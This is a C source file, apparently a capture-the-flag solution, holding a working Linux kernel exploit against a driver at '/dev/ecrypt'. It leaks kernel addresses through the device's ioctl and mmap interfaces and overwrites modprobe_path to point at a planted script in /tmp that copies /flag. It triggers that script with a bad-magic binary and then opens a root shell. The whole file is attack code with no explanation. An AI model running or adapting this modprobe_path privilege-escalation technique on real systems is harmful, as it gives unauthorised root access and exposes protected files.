#include <stdio.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/msg.h>

#define IOCTL_CHANGE_KEY			0x3003003
#define IOCTL_NULL_KEY				0x5005005
#define IOCTL_CHANGE_OR_ALLOC_DATA	0x4004004
#define IOCTL_FREE_DATA				0x6006006

#define DEVICE_NAME "/dev/ecrypt"

int fd;

int free_data()
{
	char p[0x30] = {};
	return ioctl(fd, IOCTL_FREE_DATA, p);	
}

int change_or_alloc_data(char *data)
{
	return ioctl(fd, IOCTL_CHANGE_OR_ALLOC_DATA, data);
}

void open_device()
{
	assert((fd = open(DEVICE_NAME, O_RDWR)) > 2);
}

int change_key(char *key)
{
	return ioctl(fd, IOCTL_CHANGE_KEY, key);
}

int null_key()
{
	char p[0x30] = {0};
	return ioctl(fd, IOCTL_NULL_KEY, p);
}

void setup_modprobe()
{
	system("echo -ne '#!/bin/sh\ncat /flag > /tmp/flag' > /tmp/a");
	system("chmod a+x /tmp/a");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/b");
	system("chmod a+x /tmp/b");
	system("/tmp/b");
}

int main()
{
	open_device();
	
	char key[0x20];
	char iv[0x10];
	
	memset(key, 0, 0x20);
	memset(iv, 0, 0x10);

	change_key(key);
	change_or_alloc_data(iv);
	

	uint64_t *ptr = mmap(NULL,
					0x1000,
					PROT_READ|PROT_WRITE,
					MAP_SHARED,
					fd,
					0x1000);
	printf("%p %lx\n", ptr, ptr[0]);
	uint64_t heap_base = ptr[0] & ~0xffffff;
	uint64_t sysctl_modprobe = heap_base + 0x3502540; // pt -s8 0xffffffff8234c11e
	ptr[0] = sysctl_modprobe - 0x10;

	uint64_t fake_sysctl[4];
	fake_sysctl[2] = heap_base + 0x0234c11e;
	fake_sysctl[3] = heap_base + 0x03502560;
	change_key((char *)fake_sysctl);
	
	int l = open("/proc/sys/kernel/modprobe", 0);
	uint64_t leak;
	read(l, &leak, 8);
	printf("Leak is %lx\n", leak);
	uint64_t modprobe_path = leak + 0x15e6790;
	
	ptr[0] = modprobe_path;
	change_key("/tmp/a");
	setup_modprobe();
	system("/bin/sh");
}
